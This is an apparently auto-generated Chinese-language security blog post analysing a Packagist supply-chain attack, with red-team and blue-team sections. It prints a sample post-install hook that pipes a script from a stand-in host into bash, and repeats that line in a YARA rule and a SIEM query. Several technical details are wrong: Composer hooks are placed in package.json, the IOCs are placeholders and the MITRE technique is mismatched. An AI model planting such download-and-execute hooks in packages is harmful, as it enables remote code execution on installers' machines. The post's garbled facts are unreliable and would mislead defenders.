---
layout: post
title:  "Packagist遭遇供應鏈攻擊，8個套件被感染，駭客意圖透過GitHub散布Linux惡意軟體"
date:   2026-05-25 14:42:42 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Packagist 供應鏈攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Supply Chain Attack`, `Package Manager`, `Lifecycle Hooks`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者通過竄改 Packagist 上的套件，將惡意指令碼植入 `package.json` 中，利用 Composer 安裝和管理套件的機制，實現遠程代碼執行。
* **攻擊流程圖解**:
  1. 攻擊者竄改 Packagist 上的套件，將惡意指令碼植入 `package.json` 中。
  2. 使用 Composer 安裝和管理套件的開發人員或組織下載受影響的套件。
  3. Composer 執行 `package.json` 中的 lifecycle hooks，觸發惡意指令碼的執行。
* **受影響元件**: Packagist 上的套件，尤其是那些使用 Composer 安裝和管理的套件。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 Packagist 上的套件維護權限，或者能夠竄改套件的內容。
* **Payload 建構邏輯**:

    ```
    
    json
    {
      "scripts": {
        "post-install": "curl -s https://example.com/malicious-script.sh | bash"
      }
    }
    
    ```
  *範例指令*: `curl -s https://example.com/malicious-script.sh | bash`
* **繞過技術**: 攻擊者可以使用各種方法繞過安全檢查，例如使用加密或壓縮的 payload，或者利用 Composer 的配置文件進行攻擊。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `abc123` | `192.168.1.100` | `example.com` | `/tmp/malicious-script.sh` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_script {
      meta:
        description = "Detects malicious script"
      strings:
        $a = "curl -s https://example.com/malicious-script.sh | bash"
      condition:
        $a
    }
    
    ```
  或者是具體的 **SIEM 查詢語法** (Splunk/Elastic):

    ```
    
    sql
    index=security sourcetype=composer_install post-install="curl -s https://example.com/malicious-script.sh | bash"
    
    ```
* **緩解措施**: 除了更新和修補受影響的套件之外，還需要檢查和更新 Composer 的配置文件，確保不會執行惡意指令碼。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 想像一個公司的供應鏈，就像一條長長的鏈子，一旦有一個環節出問題，整個鏈子就會受到影響。技術上是指攻擊者竄改或操縱供應鏈中的某個環節，例如軟體套件或元件，從而實現攻擊。
* **Package Manager (套件管理器)**: 一種用於管理和安裝軟體套件的工具，例如 Composer、npm 或 pip。
* **Lifecycle Hooks (生命週期掛鉤)**: 一種機制，允許開發人員在套件的不同生命週期中執行自定義的代碼，例如安裝、更新或卸載。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/176103)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


